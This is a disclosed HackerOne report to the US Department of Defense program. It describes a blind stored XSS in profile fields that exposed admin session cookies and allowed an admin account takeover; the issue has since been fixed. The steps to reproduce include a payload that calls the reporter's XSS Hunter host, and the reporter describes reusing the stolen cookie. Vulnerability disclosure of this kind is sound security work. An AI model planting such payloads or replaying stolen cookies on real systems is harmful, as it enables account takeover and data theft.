---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - vuln/xss-stored
  - vuln/xss
  - vuln/privilege-escalation
  - impact/account-takeover
  - trigger/admin-required
  - trigger/session-cookie
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2021-03-11
submitted: 2021-02-24T15:52:45.485Z
bounty_usd: null
votes: 12
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "hemantsolo"
source: "https://hackerone.com/reports/1110243"
title: "Blind Stored XSS on ███████  leads to takeover admin account"
---
# Blind Stored XSS on ███████  leads to takeover admin account

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 12 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2021-03-11

- Report: [https://hackerone.com/reports/1110243](https://hackerone.com/reports/1110243)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2021-02-24T15:52:45.485Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

##Hello Team,
I am Hemant Patidar working as a security researcher and I found a bug in your site.
Report of bug is as follows:-

##Vulnerable URL:
https://████████/

##Description:
I have found that various field of the profile page is not properly configured to wipe out HTML tags and Javascript code which leads to store the blind XSS payload in the first name, last name, title etc. and whenever the admin will check the profile the code will fire and we will get response in the XSS Hunter along with the screenshot of the admin side, IP and cookies and other sensitive information.

POC: 
XSS Hunter report attached.

## Impact

An attacker is able to access critical information from the admin panel. The XSS reveals the administrator’s IP address, backend application service, titles of mail chimp customers and internal subscription emails, admin session cookies.
An attacker can exploit the above cookies to access the admin panel.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Go to the URL by opening your account: https://█████/█████████
2. Now enter the below payload in the First name, last name, company name and title: data: "><img src="https://hemantsolo.xss.ht>/index.html?c=hemantsolo_xss" />
3. Now wait for some time you will get an XSS fire email via XSS hunter along with the screenshot and other sensitive info.

## Suggested Mitigation/Remediation Actions

## Timeline

- **Report Filed**
- **2021-02-24** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2021-02-24** @hemantsolo: Hello Team,
Also using the cookie I got access to the Admin panel.
POC: Screenshot Attached.
- **Report Title Updated**
- **2021-02-24** @agent-l8: @hemantsolo you actually logged into the app as admin based on the xss response? Can you provide the request you used so we can confirm?
- **2021-02-24** @hemantsolo: Hello @agent-l8 
The cookie is expired now but a few minutes ago I have made one you can see that one, I guess that will help.

This is the below cookie I have used:
██████████


Thanks,
Hemant Patidar
- **Report Severity Updated**
- **Report Triaged**
- **2021-03-09** @agent-j5: System owner is stating this is fixed, I know with the blind xss tickets it can take a while to get a payload back.  I have sent 2 different updates with the payload and no response from xss hunter.  I was just curious if you are still getting anything from your xss?  I don't want to close this out as resolved if you are still seeing the issue.
- **Report Needs More Info**
- **Report Resolved**
- **2021-03-10** @hemantsolo: Hello @agent-j5,
I confirm that this bug has been fixed now, As I executed my payload 17 hrs ago but till now didn't get executed.

Thanks,
Hemant Patidar
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
